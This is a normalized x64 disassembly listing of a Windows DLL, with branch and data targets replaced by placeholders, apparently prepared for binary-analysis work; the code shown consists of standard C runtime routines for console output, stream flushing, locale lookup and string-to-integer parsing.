mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov ecx 0xfffffff6
sub ecx 0x1
je r-xdata
mov ecx 0xfffffff5
jmp r-xdata
cmp ecx 0x1
jne r-xdata
xor edx edx
call [ SetStdHandle@IAT ]
mov ecx 0xfffffff4
jmp r-xdata
sub_18001bf94
sub rsp 0x38
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180010854
and [ rax ] 0x0
call sub_180010834
mov [ rax ] 0x9
jmp r-xdata
call sub_180010854
and [ rax ] 0x0
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x9
call sub_180010764
cmp ecx [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
test [ rax + rdx + 0x8 ] 0x1
je r-xdata
mov rax [ rax + rdx ]
jmp r-xdata
add rsp 0x38
retn
sub_18001c018
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x20
movsxd rbx ecx
mov r12 rbx
sar r12 0x5
lea r13 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rsi [ r13 + r12 * 8 ]
mov edi 0x1
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
test edi edi
je r-xdata
lea ecx [ rdi + 0x9 ]
call sub_180016624
nop
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
mov eax edi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
add rsp 0x20
pop r13
retn
mov rcx [ r13 + r12 * 8 ]
lea rcx [ rcx + rbx + 0x10 ]
call [ EnterCriticalSection@IAT ]
mov ecx 0xa
call sub_180016524
lea rcx [ rbx + rsi + 0x10 ]
mov edx 0xfa0
call sub_180019c14
neg eax
sbb edx edx
and edi edx
inc [ rbx + rsi + 0xc ]
sub_18001c0e8
sub rsp 0x68
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x50 ] rax
cmp [ rw-data ] 0x0
mov [ rsp + 0x40 ] cx
je r-xdata
call [ GetConsoleOutputCP@IAT ]
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov ecx eax
lea rax [ rsp + 0x48 ]
lea r8 [ rsp + 0x40 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] 0x5
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
mov rcx [ rw-data ]
cmp rcx 0xfffffffffffffffe
jne r-xdata
mov eax 0xffff
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x44 ]
lea rdx [ rsp + 0x48 ]
mov r8d eax
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
cmp rcx 0xffffffffffffffff
je r-xdata
call sub_18001d368
mov rcx [ rw-data ]
mov ax [ rsp + 0x40 ]
jmp r-xdata
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x44 ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x1
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_180017570
add rsp 0x68
retn
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
and [ rw-data ] 0x0
sub_18001c1fc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push r12
sub rsp 0x30
xor esi esi
lea ecx [ rsi + 0x1 ]
call sub_180016624
nop
lea ebx [ rsi + 0x3 ]
mov [ rsp + 0x20 ] ebx
mov ecx 0x1
call sub_180016524
mov eax esi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop r12
retn
movsxd r12 ebx
mov rax [ rw-data ]
cmp [ rax + r12 * 8 ] 0x0
je r-xdata
inc ebx
mov [ rsp + 0x20 ] ebx
jmp r-xdata
mov rcx [ rax + r12 * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
cmp ebx [ rw-data ]
jge r-xdata
cmp ebx 0x14
jl r-xdata
call sub_18001d46c
cmp eax 0xffffffff
je r-xdata
mov rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
add rcx 0x30
call [ DeleteCriticalSection@IAT ]
mov rcx [ rw-data ]
mov rcx [ rcx + r12 * 8 ]
call sub_18000e06c
mov r11 [ rw-data ]
and [ r11 + r12 * 8 ] 0x0
inc esi
mov [ rsp + 0x24 ] esi
sub_18001c2ac
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov eax [ rcx + 0x18 ]
xor esi esi
mov rbx rcx
and al 0x3
cmp al 0x2
jne r-xdata
mov rcx [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov eax esi
mov rsi [ rsp + 0x38 ]
mov [ rbx ] rcx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test [ rcx + 0x18 ] 0x108
je r-xdata
mov edi [ rcx ]
sub edi [ rcx + 0x10 ]
test edi edi
jle r-xdata
call sub_18001923c
mov rdx [ rbx + 0x10 ]
mov r8d edi
mov ecx eax
call sub_180018e20
cmp eax edi
jne r-xdata
or [ rbx + 0x18 ] 0x20
or esi 0xffffffff
mov eax [ rbx + 0x18 ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ rbx + 0x18 ] eax
jmp r-xdata
sub_18001c328
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
call sub_18001c2ac
test eax eax
je r-xdata
call sub_18001c370
jmp r-xdata
bt [ rbx + 0x18 ] 0xe
jae r-xdata
or eax 0xffffffff
jmp r-xdata
add rsp 0x20
pop rbx
retn
xor eax eax
mov rcx rbx
call sub_18001923c
mov ecx eax
call sub_18001d4e4
neg eax
sbb eax eax
jmp r-xdata
sub_18001c370
mov [ rsp + 0x8 ] rsi
mov [ rsp + 0x10 ] rdi
mov [ rsp + 0x18 ] r12
push r13
push r14
push r15
sub rsp 0x30
mov r14d ecx
xor r12d r12d
xor esi esi
lea ecx [ rsi + 0x1 ]
call sub_180016624
nop
xor edi edi
mov [ rsp + 0x20 ] edi
or r15d 0xffffffff
mov ecx 0x1
call sub_180016524
cmp r14d 0x1
cmove esi r12d
mov eax esi
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
mov r12 [ rsp + 0x60 ]
add rsp 0x30
pop r15
pop r14
pop r13
retn
movsxd r13 edi
mov rax [ rw-data ]
cmp [ rax + r13 * 8 ] 0x0
je r-xdata
inc edi
mov [ rsp + 0x20 ] edi
jmp r-xdata
mov rdx [ rax + r13 * 8 ]
test [ rdx + 0x18 ] 0x83
je r-xdata
cmp edi [ rw-data ]
jge r-xdata
mov ecx edi
call sub_18001918c
nop
mov rax [ rw-data ]
mov rcx [ rax + r13 * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov rdx [ rw-data ]
mov rdx [ rdx + r13 * 8 ]
mov ecx edi
call sub_180019214
cmp r14d 0x1
jne r-xdata
test r14d r14d
jne r-xdata
call sub_18001c328
cmp eax r15d
je r-xdata
test [ rcx + 0x18 ] 0x2
je r-xdata
inc r12d
mov [ rsp + 0x24 ] r12d
jmp r-xdata
call sub_18001c328
cmp eax r15d
cmove esi r15d
mov [ rsp + 0x28 ] esi
sub_18001c470
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x20
mov r12d ecx
mov rcx rdx
mov rbx rdx
call sub_18001923c
mov edx [ rbx + 0x18 ]
movsxd rsi eax
test dl 0x82
jne r-xdata
test dl 0x40
je r-xdata
call sub_180010834
mov [ rax ] 0x9
xor edi edi
test dl 0x1
je r-xdata
call sub_180010834
mov [ rax ] 0x22
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov eax [ rbx + 0x18 ]
mov [ rbx + 0x8 ] edi
and eax 0xffffffef
or eax 0x2
mov [ rbx + 0x18 ] eax
test eax 0x10c
jne r-xdata
mov [ rbx + 0x8 ] edi
test dl 0x10
je r-xdata
or [ rbx + 0x18 ] 0x20
test [ rbx + 0x18 ] 0x108
je r-xdata
call sub_180019018
add rax 0x30
cmp rbx rax
je r-xdata
or edx 0x20
mov [ rbx + 0x18 ] edx
jmp r-xdata
mov rax [ rbx + 0x10 ]
and edx 0xfffffffe
mov [ rbx ] rax
mov [ rbx + 0x18 ] edx
mov ebp 0x2
lea rdx [ rsp + 0x48 ]
mov ecx esi
mov r8d ebp
mov [ rsp + 0x48 ] r12w
call sub_180018e20
mov edi eax
mov ebp [ rbx ]
mov rdx [ rbx + 0x10 ]
sub ebp [ rbx + 0x10 ]
lea rax [ rdx + 0x2 ]
mov [ rbx ] rax
mov eax [ rbx + 0x24 ]
sub eax 0x2
cmp ebp edi
mov [ rbx + 0x8 ] eax
jle r-xdata
mov ecx esi
call sub_180018fa8
cmp eax edi
jne r-xdata
call sub_180019018
add rax 0x60
cmp rbx rax
jne r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax r12w
cmp esi 0xffffffff
je r-xdata
mov r8d ebp
mov ecx esi
call sub_180018e20
mov edi eax
jmp r-xdata
mov rcx rbx
call sub_180018f54
lea rcx [ rw-data ]
cmp esi 0xfffffffe
je r-xdata
mov rax [ rbx + 0x10 ]
mov [ rax ] r12w
jmp r-xdata
xor edx edx
mov ecx esi
lea r8d [ rdx + 0x2 ]
call sub_180018588
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rsi
mov rax rsi
lea rdx [ rw-data ]
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ rdx + rax * 8 ]
jmp r-xdata
cmp edi ebp
jne r-xdata
test [ rcx + 0x8 ] 0x20
je r-xdata
sub_18001c60c
sub rsp 0x5a8
test [ rw-data ] 0x1
je r-xdata
call sub_1800197b8
test rax rax
je r-xdata
mov ecx 0xa
call sub_180014acc
test [ rw-data ] 0x2
je r-xdata
mov ecx 0x16
call sub_1800197c4
mov ecx 0x3
call sub_180011420
int3
lea rcx [ rsp + 0xd0 ]
call [ RtlCaptureContext@IAT ]
lea rcx [ rsp + 0x30 ]
xor edx edx
mov r8d 0x98
call sub_180016870
mov rax [ rsp + 0x5a8 ]
xor ecx ecx
mov [ rsp + 0x40 ] rax
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x30 ] 0x40000015
mov [ rsp + 0x20 ] rax
lea rax [ rsp + 0xd0 ]
mov [ rsp + 0x28 ] rax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x20 ]
call [ UnhandledExceptionFilter@IAT ]
sub_18001c6b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x20 ]
mov rbx r9
mov edi r8d
call sub_18000d428
mov r9d [ rsp + 0x70 ]
mov r8 rbx
mov edx edi
mov ecx esi
call [ GetLocaleInfoW@IAT ]
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18001c70c
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x50
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp ] rax
mov r10d [ rw-data ]
mov esi 0x1
xor ebx ebx
mov r15 r9
mov r13d r8d
mov r14d edx
mov rdi rcx
lea r12d [ rsi + 0x1 ]
cmp r10d ebx
jne r-xdata
cmp r10d r12d
je r-xdata
xor r9d r9d
xor r8d r8d
mov edx esi
xor ecx ecx
call [ GetLocaleInfoW@IAT ]
cmp eax ebx
je r-xdata
mov r9d [ rbp + 0x60 ]
mov r8 r15
mov edx r13d
mov ecx r14d
call [ GetLocaleInfoA@IAT ]
cmp r10d ebx
je r-xdata
call [ GetLastError@IAT ]
mov r10d [ rw-data ]
cmp eax 0x78
cmove r10d r12d
mov [ rw-data ] r10d
mov [ rw-data ] esi
jmp r-xdata
cmp r10d esi
jne r-xdata
mov esi [ rbp + 0x68 ]
cmp esi ebx
jne r-xdata
xor eax eax
jmp r-xdata
xor r9d r9d
xor r8d r8d
mov edx r13d
mov ecx r14d
call [ GetLocaleInfoW@IAT ]
movsxd r12 eax
cmp r12d ebx
jne r-xdata
mov rax [ rdi ]
mov esi [ rax + 0x4 ]
mov rcx [ rbp ]
xor rcx rbp
call sub_180017570
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
jle r-xdata
mov rdi rbx
xor edx edx
lea rax [ rdx - 0x20 ]
div r12
cmp rax 0x2
jb r-xdata
mov r9d r12d
mov r8 rdi
mov edx r13d
mov ecx r14d
call [ GetLocaleInfoW@IAT ]
cmp eax ebx
je r-xdata
lea rcx [ r12 + r12 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov eax [ rbp + 0x60 ]
or r9d 0xffffffff
xor edx edx
mov [ rsp + 0x38 ] rbx
mov r8 rdi
mov ecx esi
mov [ rsp + 0x30 ] rbx
cmp eax ebx
jne r-xdata
call sub_18000e0ac
mov rdi rax
cmp rax rbx
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax ebx
jmp r-xdata
call sub_18000e06c
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r15
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
jmp r-xdata
cmp rdi rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_1800232c0
sub rsp rax
lea rdi [ rsp + 0x40 ]
cmp rdi rbx
je r-xdata
mov rax 0xffffffffffffff0
call [ WideCharToMultiByte@IAT ]
mov ebx eax
mov [ rdi ] 0xcccc
jmp r-xdata
add rdi 0x10
jmp r-xdata
sub_18001c8e8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x50
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x30 ]
mov rbx r9
mov edi r8d
call sub_18000d428
mov r11d [ rsp + 0x88 ]
mov eax [ rsp + 0x80 ]
lea rcx [ rsp + 0x30 ]
mov [ rsp + 0x28 ] r11d
mov r9 rbx
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_18001c70c
cmp [ rsp + 0x48 ] 0x0
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18001c95c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x20 ]
mov ebx r9d
mov rdi r8
call sub_18000d428
cmp ebx 0xffffffff
jge r-xdata
mov r9 [ rsp + 0x70 ]
mov r8d ebx
mov rdx rdi
mov ecx esi
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_18001c9c0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x50
mov r14 rdx
mov rdx rcx
lea rcx [ rax - 0x38 ]
mov r12d r9d
mov r13 r8
call sub_18000d428
test r13 r13
je r-xdata
test r14 r14
jne r-xdata
mov [ r13 ] r14
test r12d r12d
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
cmp [ rsp + 0x48 ] 0x0
jmp r-xdata
mov bpl [ r14 ]
mov r8 [ rsp + 0x30 ]
xor edi edi
lea rbx [ r14 + 0x1 ]
cmp r12d 0x2
jl r-xdata
je r-xdata
mov rax [ r8 + 0x140 ]
movzx ecx bpl
movzx eax [ rax + rcx * 2 ]
and eax 0x8
lea r8 [ rsp + 0x30 ]
movzx ecx bpl
mov edx 0x8
call sub_18001cc74
mov r8 [ rsp + 0x30 ]
jmp r-xdata
cmp r12d 0x24
jg r-xdata
xor eax eax
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
mov esi [ rsp + 0x90 ]
cmp bpl 0x2d
jne r-xdata
mov bpl [ rbx ]
inc rbx
jmp r-xdata
test eax eax
je r-xdata
cmp bpl 0x2b
jne r-xdata
or esi 0x2
jmp r-xdata
cmp [ r8 + 0x10c ] 0x1
jle r-xdata
test r12d r12d
js r-xdata
mov bpl [ rbx ]
inc rbx
test r13 r13
je r-xdata
cmp r12d 0x1
je r-xdata
cmp [ rsp + 0x48 ] dil
mov [ r13 ] r14
cmp r12d 0x24
jg r-xdata
test r12d r12d
jne r-xdata
cmp r12d 0x10
jne r-xdata
cmp bpl 0x30
je r-xdata
mov r10 [ r8 + 0x140 ]
xor edx edx
or eax 0xffffffff
div r12d
mov r9d eax
cmp bpl 0x30
jne r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r12d 0xa
jmp r-xdata
test r8d 0x103
je r-xdata
movsx ecx bpl
sub ecx 0x30
jmp r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r12d 0x10
jmp r-xdata
cmp [ rbx ] 0x58
je r-xdata
dec rbx
test sil 0x8
jne r-xdata
lea eax [ rbp - 0x61 ]
movsx ecx bpl
cmp al 0x19
ja r-xdata
cmp ecx r12d
jae r-xdata
mov bpl [ rbx + 0x1 ]
add rbx 0x2
cmp [ rbx ] 0x58
jne r-xdata
mov r12d 0x8
jmp r-xdata
mov ebp 0x7fffffff
test sil 0x4
jne r-xdata
test r13 r13
cmovne rbx r14
xor edi edi
jmp r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or esi 0x8
cmp edi r9d
jb r-xdata
call sub_180010834
mov [ rax ] 0x22
test sil 0x1
je r-xdata
test sil 0x1
jne r-xdata
test r13 r13
je r-xdata
imul edi r12d
add edi ecx
jne r-xdata
mov al sil
and al 0x2
neg al
sbb edi edi
neg edi
add edi ebp
or edi 0xffffffff
jmp r-xdata
mov eax esi
and eax 0x2
je r-xdata
test sil 0x2
je r-xdata
mov [ r13 ] rbx
movzx ecx bpl
movzx r8d [ r10 + rcx * 2 ]
test r8b 0x4
je r-xdata
or esi 0x4
test r13 r13
jne r-xdata
cmp ecx edx
jbe r-xdata
test eax eax
jne r-xdata
cmp edi 0x80000000
ja r-xdata
cmp [ rsp + 0x48 ] 0x0
je r-xdata
neg edi
mov bpl [ rbx ]
inc rbx
jmp r-xdata
cmp edi ebp
jbe r-xdata
mov eax edi
jmp r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
sub_18001cc44
sub rsp 0x38
xor eax eax
mov r9d r8d
mov r8 rdx
mov [ rsp + 0x20 ] eax
mov rdx rcx
cmp [ rw-data ] eax
jne r-xdata
xor ecx ecx
lea rcx [ rw-data ]
jmp r-xdata
call sub_18001c9c0
add rsp 0x38
retn
sub_18001cc74
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x60
movsxd rdi ecx
mov ebp edx
lea rcx [ rsp + 0x40 ]
mov rdx r8
call sub_18000d428
lea r11d [ rdi + 0x1 ]
cmp r11d 0x100
ja r-xdata
mov esi edi
lea rdx [ rsp + 0x40 ]
sar esi 0x8
movzx ecx sil
call sub_180019628
mov edx 0x1
test eax eax
je r-xdata
mov rax [ rsp + 0x40 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + rdi * 2 ]
jmp r-xdata
mov [ rsp + 0x88 ] dil
mov [ rsp + 0x89 ] 0x0
mov r9d edx
mov [ rsp + 0x88 ] sil
mov [ rsp + 0x89 ] dil
mov [ rsp + 0x8a ] 0x0
lea r9d [ rdx + 0x1 ]
jmp r-xdata
and eax ebp
cmp [ rsp + 0x58 ] 0x0
je r-xdata
movzx eax [ rsp + 0x70 ]
cmp [ rsp + 0x58 ] al
je r-xdata
mov rcx [ rsp + 0x40 ]
mov [ rsp + 0x38 ] edx
lea r8 [ rsp + 0x88 ]
mov eax [ rcx + 0x14 ]
mov [ rsp + 0x30 ] eax
mov eax [ rcx + 0x4 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x70 ]
mov [ rsp + 0x20 ] rax
call sub_1800178d4
test eax eax
jne r-xdata
lea r11 [ rsp + 0x60 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_18001cd80
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov rdi rcx
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x18 ]
test al 0x83
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
jmp r-xdata
mov eax 0xffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ rcx + 0x18 ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ rcx + 0x18 ] eax
jmp r-xdata
mov rax [ rcx + 0x10 ]
mov [ rcx ] rax
call sub_180018f54
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ rdi + 0x18 ] eax
and [ rdi + 0x8 ] 0x0
cmp eax 0x1
je r-xdata
mov rcx rdi
call sub_18001923c
mov r8d [ rdi + 0x24 ]
mov rdx [ rdi + 0x10 ]
mov ecx eax
call sub_18001dd78
mov [ rdi + 0x8 ] eax
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
test [ rdi + 0x18 ] 0x82
jne r-xdata
cmp [ rdi + 0x24 ] 0x200
jne r-xdata
mov rcx rdi
call sub_18001923c
cmp eax 0xffffffff
je r-xdata
mov rcx [ rdi ]
add [ rdi + 0x8 ] 0xfffffffe
movzx eax [ rcx ]
add rcx 0x2
mov [ rdi ] rcx
jmp r-xdata
test [ rdi + 0x18 ] 0x8
je r-xdata
lea r11 [ rw-data ]
mov rcx rdi
call sub_18001923c
cmp eax 0xfffffffe
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
bt [ rdi + 0x18 ] 0xa
jb r-xdata
bts [ rdi + 0x18 ] 0xd
mov rcx rdi
call sub_18001923c
mov rcx rdi
lea rsi [ rw-data ]
movsxd rbx eax
sar rbx 0x5
call sub_18001923c
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ rsi + rbx * 8 ]
jmp r-xdata
mov [ rdi + 0x24 ] 0x1000
mov al [ r11 + 0x8 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_18001cee8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
test [ rdx + 0x18 ] 0x40
mov rbx rdx
mov edi ecx
jne r-xdata
cmp edi 0xffffffff
je r-xdata
mov rcx rdx
call sub_18001923c
lea rdx [ rw-data ]
lea r8 [ rw-data ]
movsxd r11 eax
cmp r11d 0xffffffff
je r-xdata
or eax 0xffffffff
test [ rbx + 0x18 ] 0x1
jne r-xdata
mov rcx rdx
cmp r11d 0xfffffffe
je r-xdata
cmp [ rbx + 0x10 ] 0x0
jne r-xdata
test [ rbx + 0x18 ] 0x80
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
cmp r11d 0xffffffff
je r-xdata
mov rcx r11
mov rax r11
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ r8 + rax * 8 ]
jmp r-xdata
mov rax [ rbx ]
cmp rax [ rbx + 0x10 ]
jne r-xdata
mov rcx rbx
call sub_180018f54
test [ rbx + 0x18 ] 0x2
jne r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp r11d 0xfffffffe
je r-xdata
test [ rcx + 0x38 ] 0x7f
jne r-xdata
dec [ rbx ]
test [ rbx + 0x18 ] 0x40
mov rax [ rbx ]
je r-xdata
cmp [ rbx + 0x8 ] 0x0
jne r-xdata
mov rdx r11
mov rax r11
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r8 + rax * 8 ]
mov [ rax ] dil
cmp [ rax ] dil
je r-xdata
inc rax
mov [ rbx ] rax
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
inc [ rbx + 0x8 ]
and [ rbx + 0x18 ] 0xffffffef
or [ rbx + 0x18 ] 0x1
movzx eax dil
jmp r-xdata
inc rax
mov [ rbx ] rax
jmp r-xdata
sub_18001d004
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x30
mov rbx rdx
mov edi ecx
xor eax eax
test rdx rdx
setne al
test eax eax
jne r-xdata
mov rcx rdx
call sub_18001912c
nop
mov rdx rbx
mov ecx edi
call sub_18001cee8
mov edi eax
mov rcx rbx
call sub_1800191bc
mov eax edi
call sub_180010834
mov [ rax ] 0x16
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
sub_18001d074
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov rdi rcx
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x18 ]
test al 0x83
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ rcx + 0x18 ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ rcx + 0x18 ] eax
jmp r-xdata
mov rax [ rcx + 0x10 ]
mov [ rcx ] rax
call sub_180018f54
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ rdi + 0x18 ] eax
and [ rdi + 0x8 ] 0x0
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_18001923c
mov r8d [ rdi + 0x24 ]
mov rdx [ rdi + 0x10 ]
mov ecx eax
call sub_18001dd78
mov [ rdi + 0x8 ] eax
test eax eax
je r-xdata
test [ rdi + 0x18 ] 0x82
jne r-xdata
cmp [ rdi + 0x24 ] 0x200
jne r-xdata
mov rcx rdi
call sub_18001923c
cmp eax 0xffffffff
je r-xdata
mov rcx [ rdi ]
dec [ rdi + 0x8 ]
movzx eax [ rcx ]
inc rcx
mov [ rdi ] rcx
jmp r-xdata
test [ rdi + 0x18 ] 0x8
je r-xdata
lea r11 [ rw-data ]
mov rcx rdi
call sub_18001923c
cmp eax 0xfffffffe
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
bt [ rdi + 0x18 ] 0xa
jb r-xdata
bts [ rdi + 0x18 ] 0xd
mov rcx rdi
call sub_18001923c
mov rcx rdi
lea rsi [ rw-data ]
movsxd rbx eax
sar rbx 0x5
call sub_18001923c
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ rsi + rbx * 8 ]
jmp r-xdata
mov [ rdi + 0x24 ] 0x1000
mov al [ r11 + 0x8 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_18001d1d0
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x70
movsxd rdi ecx
lea rcx [ rsp + 0x50 ]
call sub_18000d428
cmp edi 0x100
jae r-xdata
mov rax [ rsp + 0x50 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rdx [ rsp + 0x50 ]
cmp [ rdx + 0x10c ] 0x1
jle r-xdata
call sub_180010834
mov edx 0x1
mov [ rax ] 0x2a
